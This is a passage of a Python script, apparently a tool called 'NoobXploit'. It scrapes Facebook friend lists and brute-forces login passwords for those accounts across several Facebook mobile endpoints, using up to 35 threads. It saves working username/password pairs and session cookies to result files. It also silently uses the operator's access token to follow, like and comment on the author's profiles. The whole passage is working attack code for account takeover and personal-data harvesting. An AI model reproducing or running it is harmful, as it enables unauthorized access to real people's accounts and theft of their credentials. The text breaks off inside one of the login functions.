        ___kata___ = random.choice(["Life is 10 percent what happens to you and 90 percent how you react to it. - Charles R. Swindoll', 'Success seems to be tied to action. Successful people keep moving. They make mistakes, but they don't sto. - Conrad Hilton', 'Courage is what it takes to stand up and speak. Courage is also required to sit and listen. - Winston Churchill', 'Dare to dream, but more importantly, dare to act behind your dreams. - Josh Hinds', 'Failure will never follow if the will to succeed is strong enough. - Og Mandino', 'Life shrinks or grows in proportion to one's courage. - Anais Nin', 'There are two ways to spread light: to be a candle or a mirror that reflects it. - Edith Wharton', 'Opportunity is like a sunrise. If you wait too long, you can miss it. - William Arthur Ward', 'Happiness is not something ready to be made. It comes from your own actions. - Dalai Lama"])
        ___comment___ = (___say___+'\n\n'+___kata___+'\n'+___waktu___)
        ___comment2___ = (___say___+'\n\n'+___kata___+'\n'+___waktu___)
        ___comment3___ = random.choice(['Hello Bro','Mantap Bang','Keren Bang','Very Nice','Super','Hallo Bang'])
        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(___token___)) #noob
        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(___token___)) #noob2
        requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(___token___)) #noobxploit
        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=%s'%(___token___)) #cover photo
        requests.post('https://graph.facebook.com/10159090813023544/likes?summary=true&access_token=%s'%(___token___)) # profile picture
        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(___comment3___,___token___)) #cover photo
        requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(___comment___,___token___)) #profile picture
        requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(___comment2___,___token___)) #profile picture
        requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(___token___)) # Iwan
	requests.post('https://graph.facebook.com/100000496418851/subscribers?access_token=%s'%(___token___)) # Riyajul Islam
    except:
        exit("%s[%s!%s]%s Login Failed"%(P,M,P,M))
    print("%s[%s*%s]%s Login Succeed"%(H,P,H,P))
    ___menu___()
# Menu
def ___menu___():
    os.system('clear')
    print(___logo___)
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2)
        ___login___()
    try:
        xoz = requests.get('https://graph.facebook.com/me/?access_token=%s'%(___token___)).json()
        print("%s[%s🔥%s]%s Welcome :%s %s"%(B,P,B,P,H,xoz['name']))
        try:
            print("%s[%s*%s]%s Email :%s %s"%(B,P,B,P,H,xoz['email']))
        except:
            print("%s[%s🔥%s]%s Email :%s email_is_none@gmail.com"%(B,P,B,P,H))
        print("%s[%s🔥%s]%s User :%s %s"%(B,P,B,P,H,xoz['id']))
    except (KeyError):
        print("%s[%s!%s]%s Token Invalid"%(P,M,P,M));sleep(2);os.system('rm - rf login.txt')
        ___login___()
    except (ConnectionError):
        exit("%s[%s!%s]%s Connection Error"%(P,M,P,M))
    print("\n%s[%s1%s]%s Dump Random Public Id (2004-2021)"%(H,U,H,P))
    print("%s[%s2%s]%s Dump Public Old Id (2009-2006)"%(H,U,H,P))
    print("%s[%s3%s]%s Start Crack %s[%sFast%s/%sSlow%s]"%(B,U,B,P,K,H,K,H,K))
    print("%s[%s4%s]%s View Results"%(H,U,H,P))
    print("%s[%s5%s]%s Report Bug"%(H,U,H,P))
    print("%s[%s6%s]%s Remove Token"%(H,U,H,P))
    ___menu___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___menu___ in ['1','01']:
        ___random___()
    elif ___menu___ in ['2','02']:
        ___masal2___()
    elif ___menu___ in ['3','03']:
        ___metode___()
    elif ___menu___ in ['4','04']:
        print("\n%s[%s1%s]%s See NoobXploit Ok.txt"%(B,P,B,P))
        print("%s[%s2%s]%s See NoobXploit Cp.txt"%(B,P,B,P))
        print("%s[%s3%s]%s Return"%(B,K,B,P))
        ___hasilz___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___hasilz___ in ['1','01']:
            try:
                ___ok___ = open('Results/Ok.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s NoobXploit Ok.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Ok.txt')
            print("\n%s[%s*%s]%s Total NoobXploit Ok.txt :%s %s"%(B,P,B,P,H,len(open('Results/Ok.txt','r').readlines())))
        elif ___hasilz___ in ['2','02']:
            try:
                ___cp___ = open('Results/Cp.txt','r').read()
            except (IOError):
                exit("%s[%s!%s]%s Riyajul Cp.txt There isn't any"%(P,M,P,M))
            print("%s "%(P))
            os.system('cat Results/Cp.txt')
            print("\n%s[%s*%s]%s Total NoobXploit Cp.txt :%s %s"%(B,P,B,P,H,len(open('Results/Cp.txt','r').readlines())))
        elif ___hasilz___ in ['3','03']:
            ___menu___()
        else:
            exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
    elif ___menu___ in ['12']:
        print("%s[%s*%s]%s You Will Be Redirected To Whatsapp"%(B,P,B,P));sleep(2)
        os.system("xdg-open https://wa.me/+8801974401047?text=Hallo%20Noob%20Xploit")
        exit()
    elif ___menu___ in ['13']:
        os.system('rm -rf login.txt')
        exit()
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# random attack
def ___random___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Amount ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Name File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                file.write(a['id']+"<=>"+a['name']+'\n')
                print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Done..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s Files Saved In :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sReturn%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
# Random Old
def ___masal2___():
    try:
        ___token___ = open('login.txt','r').read()
    except (IOError):
        exit("%s[%s!%s]%s Token Invalid"%(P,M,P,M))
    try:
        ___total___ = int(raw_input("\n%s[%s?%s]%s Amount ID :%s "%(B,P,B,P,H)))
    except:
        ___total___ = 1
    ___file___ = raw_input("%s[%s?%s]%s Name File :%s "%(B,P,B,P,H))
    for zx in range(___total___):
        zx +=1
        ___ids___ = raw_input("%s[%s%s%s]%s User :%s "%(B,P,zx,B,P,H))
        print(" ")
        if ___ids___ in ['',' ']:
            exit("%s[%s!%s]%s Don't Empty"%(P,M,P,M))
        try:
            rex = requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(___ids___,___token___)).json()
            file = open(___file___ , 'a')
            for a in rex['friends']['data']:
                if len(a['id'])==7 or len(a['id'])==8 or len(a['id'])==9 or len(a['id'])==10:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:10] in ['1000000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:9] in ['100000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:8] in ['10000000']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
                elif a['id'][:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:
                    file.write(a['id']+"<=>"+a['name']+'\n')
                    print("\r\x1b[1;97m"+a['id']+"<=>"+a['name'])
            file.close()
            ___user___ = open(___file___,'r').readlines()
            print("\r%s                    "%(P))
            print("%s[%s*%s]%s Done..."%(H,P,H,P))
            print("%s[%s?%s]%s Total ID :%s %s"%(H,P,H,P,K,len(___user___)))
            print("%s[%s?%s]%s Files Saved In :%s %s"%(H,P,H,P,K,___file___))
            raw_input("\n%s[%sReturn%s]"%(B,H,B));___menu___()
        except (KeyError):
            exit("%s[%s!%s]%s Dump Fail"%(P,M,P,M))
        except (ConnectionError):
            exit("%s[%s!%s]%s Connection Error"%(P,K,P,K))
def ___metode___():
    print("\n%s[%s1%s]%s Metode mbasic.facebook.com"%(B,P,B,P))
    print("%s[%s2%s]%s Metode free.facebook.com"%(B,P,B,P))
    print("%s[%s3%s]%s Metode mobile.facebook.com"%(B,P,B,P))
    print("%s[%s4%s]%s Metode d.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
    print("%s[%s5%s]%s Metode b-api.facebook.com"%(B,P,B,P))
    print("%s[%s6%s]%s Metode x.facebook.com %s[%sNew%s]"%(M,P,M,P,B,H,B))
    ___metode___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
    if ___metode___ in ['1','01']:
        print("\n%s[%s1%s]%s Auto Password Cracking"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%sX%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sX%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sX%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox =  Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['2','02']:
        print("\n%s[%s1%s]%s Auto Password (8)"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ >3]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n[*] Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must be more then 6 digits"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s File There isn't any"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(free, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,B))
    elif ___metode___ in ['3','03']:
        print("\n%s[%s1%s]%s Use Password [Auto Password]"%(H,P,H,P))  
        print("%s[%s4%s]%s Use Password Manual [ >6 ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['4','04']:
            print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.lower().split(' ')[0]
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['4','04']:
        print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['5','05']:
        print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    elif ___metode___ in ['6','06']:
        print("\n%s[%s1%s]%s Auto Crack [Recommend]"%(H,P,H,P))
        print("%s[%s2%s]%s Use Password Manual [ Make Your Own Password ]"%(H,P,H,P))
        ___password___ = raw_input("\n%s[%s?%s]%s Choose :%s "%(B,H,B,P,K))
        if ___password___ in ['2','02']:
            print("\n%s[%s*%s]%s Use a comma for a different password. Example: Iloveyou, Ihateyou, Riyajul,"%(H,P,H,P))
            pwd = raw_input("%s[%s?%s]%s Password :%s "%(H,P,H,P,B)).split(',')
            if pwd <=5:
                exit("%s[%s!%s]%s Password Must Be More Than 6 Characters"%(P,M,P,M))
        try:
            ___file___ = raw_input("%s[%s?%s]%s File Dump :%s "%(H,P,H,P,B))
            ids=open(___file___).read().splitlines()
        except:
            exit("%s[%s!%s]%s There isn't any File"%(P,M,P,M))
        print("\n%s[%sâ€¢%s]%s NoobXploit Ok Saved in :%s Results/Ok.txt"%(B,P,B,P,H))
        print("%s[%sâ€¢%s]%s NoobXploit Cp Saved in :%s Results/Cp.txt"%(B,P,B,P,K))
        print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
        with ThreadPoolExecutor(max_workers=35) as (hayuk):
            for user in ids:
                uid, Name = user.split('<=>')
                ox = Name.split(' ')
                if ___password___ in ['1','01']:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                elif ___password___ in ['2','02']:
                    pwx = pwd
                else:
                    pwx = [Name,ox[0]+'123'+ox[0]+'12345']
                hayuk.submit(mbasic, ids, uid, pwx)
        os.remove(___file___)
        exit("\n%s[%sDone%s]"%(B,H,P))
    else:
        exit("%s[%s!%s]%s Wrong Input"%(P,M,P,M))
# Crack Mbasic.Facebook.Com
def mbasic(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://mbasic.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "mbasic.facebook.com", "referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Free.Facebook.Com
def free(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://free.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "free.facebook.com", "referer": "https://free.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://free.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack Mobile.Facebook.Com
def mobile(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://m.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "m.facebook.com", "referer": "https://m.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://m.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack D.Facebook.Com
def crack(ids, uid, pwx, **kwargs):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"origin": "https://d.facebook.com", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "d.facebook.com", "referer": "https://d.facebook.com/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
            p = ses.get("https://d.facebook.com/login/?next&ref=dbl&refid=8").text
            b = parser(p,"html.parser")
            bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:continue
                except:pass
            kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
            gaaa = ses.post("https://d.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fd.facebook.com%2F&lwv=100&refid=8",data=kwargs)
            if "c_user" in ses.cookies.get_dict().keys():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print("\r\x1b[1;92m[Ok] %s|%s %s\x1b[1;97m"%(uid, pw, kuki))
                ok.append("%s|%s"%(uid, pw))
                open("Results/Ok.txt","a").write("%s|%s\n"%(uid, pw))
                break
            elif "checkpoint" in ses.cookies.get_dict().keys():
                print("\r\x1b[1;93m[Cp] %s|%s\x1b[1;97m       "%(uid, pw))
                cp.append("%s|%s"%(uid, pw))
                open("Results/Cp.txt","a").write("%s|%s\n"%(uid, pw))
                break
            else:
                continue
        loop +=1
    except:
        pass
# Crack B-api.Facebook.com
def api(ids, uid, pwx):
    global loop, ua, ok, cp
    sys.stdout.write(
        "\r\x1b[1;97m[Crack] %s/%s Ok:-%s - Cp:-%s "%(loop, len(ids), len(ok), len(cp))
    ); sys.stdout.flush()
    try:
        for pw in pwx:
            pw = pw.lower()
            ses = requests.Session()
            headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
